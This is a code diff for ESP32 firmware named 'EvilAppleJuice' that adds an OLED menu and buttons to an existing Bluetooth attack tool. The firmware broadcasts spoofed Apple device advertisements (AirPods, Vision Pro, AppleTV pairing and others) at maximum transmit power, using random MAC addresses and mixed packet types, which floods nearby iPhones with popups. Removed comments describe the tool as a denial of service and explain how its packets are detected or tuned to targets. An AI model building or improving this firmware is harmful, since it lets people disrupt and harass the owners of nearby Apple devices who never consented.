@@ -10,6 +10,23 @@
 #include <BLEServer.h>
 #include <Preferences.h>
 #include <esp_arduino_version.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+
+// ============= OLED SETUP =============
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_RESET -1
+#define SDA_PIN 21
+#define SCL_PIN 22
+
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+
+// ============= BUTTON PINS =============
+#define BUTTON_UP 23
+#define BUTTON_DOWN 27
+#define BUTTON_SELECT 12
 
 // ============= LED.HPP =============
 enum LEDMode { OFF = 0, FLASH = 1, ON = 2 };
@@ -36,6 +53,19 @@ enum LEDState {
   LEFT_ON_RIGHT_OFF = 6,
   LEFT_ON_RIGHT_FLASH = 7,
   LEFT_ON_RIGHT_ON = 8
+};
+
+// Mode names for display
+const char* modeNames[] = {
+  "AirPods",
+  "Random Device",
+  "Software Update",
+  "AirPods Gen 2",
+  "Vision Pro",
+  "AirPods Max",
+  "AppleTV Setup",
+  "Transfer Number",
+  "AppleTV Pair"
 };
 
 // ============= DEVICES.HPP =============
@@ -173,60 +203,136 @@ BLEAdvertising *pAdvertising;  // global variable
 uint32_t delayMilliseconds = 100;
 
 int currentMode = 0;
+bool isAdvertising = false;
 Preferences preferences;
 
-#define RIGHT_LED 12
-#define LEFT_LED 13
-const int BOOT_BUTTON_PIN = 9;
-const unsigned long LONG_PRESS_TIME = 1000; // 1 seconds
+// Button debounce
+unsigned long lastButtonTime = 0;
+const unsigned long DEBOUNCE_DELAY = 200;
+
+// ============= OLED DISPLAY FUNCTIONS =============
+void initDisplay() {
+  Wire.begin(SDA_PIN, SCL_PIN);
+  
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("SSD1306 allocation failed"));
+    for(;;);
+  }
+  
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println("EvilAppleJuice");
+  display.println("Initializing...");
+  display.display();
+}
+
+void updateDisplay() {
+  display.clearDisplay();
+  display.setTextSize(2);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  
+  // Mode number
+  display.print("Mode: ");
+  display.println(currentMode);
+  
+  // Mode name
+  display.setTextSize(1);
+  display.setCursor(0, 25);
+  display.println(modeNames[currentMode]);
+  
+  // Status
+  display.setCursor(0, 40);
+  if (isAdvertising) {
+    display.println("Status: Broadcasting");
+  } else {
+    display.println("Status: Stopped");
+  }
+  
+  // LED indicators
+  display.setCursor(0, 50);
+  display.print("LEDs: ");
+  if (stateTable[currentMode][0] == ON) display.print("L ");
+  else if (stateTable[currentMode][0] == FLASH) display.print("L* ");
+  else display.print("   ");
+  
+  if (stateTable[currentMode][1] == ON) display.print("R");
+  else if (stateTable[currentMode][1] == FLASH) display.print("R*");
+  
+  display.display();
+}
+
+// ============= BUTTON HANDLING =============
+void handleButtons() {
+  unsigned long currentTime = millis();
+  
+  if (currentTime - lastButtonTime < DEBOUNCE_DELAY) {
+    return;
+  }
+  
+  if (digitalRead(BUTTON_UP) == LOW) {
+    lastButtonTime = currentTime;
+    currentMode = (currentMode + 1) % 9;
+    Serial.printf("Mode increased to: %d\n", currentMode);
+    preferences.begin("my-app", false);
+    preferences.putInt("mode", currentMode);
+    preferences.end();
+    updateDisplay();
+  }
+  
+  if (digitalRead(BUTTON_DOWN) == LOW) {
+    lastButtonTime = currentTime;
+    currentMode = (currentMode - 1 + 9) % 9;
+    Serial.printf("Mode decreased to: %d\n", currentMode);
+    preferences.begin("my-app", false);
+    preferences.putInt("mode", currentMode);
+    preferences.end();
+    updateDisplay();
+  }
+  
+  if (digitalRead(BUTTON_SELECT) == LOW) {
+    lastButtonTime = currentTime;
+    isAdvertising = !isAdvertising;
+    Serial.printf("Advertising toggled: %s\n", isAdvertising ? "ON" : "OFF");
+    updateDisplay();
+  }
+}
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting ESP32 BLE");
+  Serial.println("Starting ESP32 BLE with OLED");
 
+  // Setup button pins
+  pinMode(BUTTON_UP, INPUT_PULLUP);
+  pinMode(BUTTON_DOWN, INPUT_PULLUP);
+  pinMode(BUTTON_SELECT, INPUT_PULLUP);
+
+  // Initialize display
+  initDisplay();
+  
   // Open "storage" namespace (false = read/write)
   preferences.begin("my-app", false);
-
-  // Get the current mode, default to 0 if it doesn't exist
   currentMode = preferences.getInt("mode", 0);
-  Serial.printf("Current Mode: %d\n", currentMode);
   preferences.end();
-
-  // This is specific to the AirM2M ESP32 board
-  // https://wiki.luatos.com/chips/esp32c3/board.html
-  pinMode(RIGHT_LED, OUTPUT);
-  pinMode(LEFT_LED, OUTPUT);
-  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
+  
+  Serial.printf("Current Mode: %d\n", currentMode);
   
   BLEDevice::init("AirPods 69");
 
   // Increase the BLE Power to 21dBm (MAX)
-  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
   // Create the BLE Server
   BLEServer *pServer = BLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
 
-  // seems we need to init it with an address in setup() step.
+  // Set initial device address
   esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
   pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-}
-
-void resetMode(){
-  currentMode = 0;
-  Serial.printf("Resetting mode to %d\n", currentMode);
-  preferences.begin("my-app", false);
-  preferences.putInt("mode", currentMode);
-  preferences.end();
-}
-
-void nextMode(){
-  currentMode = (currentMode + 1) % (sizeof(stateTable) / sizeof(stateTable[0]));
-  Serial.printf("Updating mode to %d\n", currentMode);
-  preferences.begin("my-app", false);
-  preferences.putInt("mode", currentMode);
-  preferences.end();
+  
+  updateDisplay();
 }
 
 void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
@@ -270,24 +376,16 @@ bool shouldBeLitOff(LEDMode mode) {
 }
 
 void loop() {
-  digitalWrite(LEFT_LED,  shouldBeLitOn(stateTable[currentMode][0])  ? HIGH : LOW);
-  digitalWrite(RIGHT_LED, shouldBeLitOn(stateTable[currentMode][1]) ? HIGH : LOW);
-
-  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
-    unsigned long startTime = millis();
-    while(digitalRead(BOOT_BUTTON_PIN) == LOW); 
-
-    unsigned long pressDuration = millis() - startTime;
-    if (pressDuration > LONG_PRESS_TIME) {
-      Serial.println("BOOT button long pressed!");
-      resetMode();
-    } else {
-      Serial.println("BOOT button short pressed!");
-      nextMode();
-    }
+  // Handle button input
+  handleButtons();
+  
+  // If not advertising, just wait
+  if (!isAdvertising) {
+    delay(100);
+    return;
   }
 
-  // First generate fake random MAC
+  // Generate fake random MAC
   esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   for (int i = 0; i < 6; i++){
     dummy_addr[i] = random(256);
@@ -335,19 +433,6 @@ void loop() {
       break;
   }
 
-  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
-      the three advertising PDU types when you want to connect to Apple devices.
-          // 0 = ADV_TYPE_IND, 
-          // 1 = ADV_TYPE_SCAN_IND
-          // 2 = ADV_TYPE_NONCONN_IND
-      
-      Randomly using any of these PDU types may increase detectability of spoofed packets. 
-
-      What we know for sure:
-      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
-                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
-  */
-  
   int adv_type_choice = random(3);
   if (adv_type_choice == 0){
     pAdvertising->setAdvertisementType(ADV_TYPE_IND);
@@ -360,24 +445,10 @@ void loop() {
   // Set the device address, advertisement data
   pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   pAdvertising->setAdvertisementData(oAdvertisementData);
-  
-  // Set advertising interval
-  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
-      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
-      
-      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
-  */
-
-  //pAdvertising->setMinInterval(0x20);
-  //pAdvertising->setMaxInterval(0x20);
-  //pAdvertising->setMinPreferred(0x20);
-  //pAdvertising->setMaxPreferred(0x20);
 
   // Start advertising
   pAdvertising->start();
 
-  digitalWrite(LEFT_LED,  shouldBeLitOff(stateTable[currentMode][0]) ? LOW : HIGH);
-  digitalWrite(RIGHT_LED, shouldBeLitOff(stateTable[currentMode][1]) ? LOW : HIGH);
   delay(delayMilliseconds); // delay for delayMilliseconds ms
   pAdvertising->stop();
 
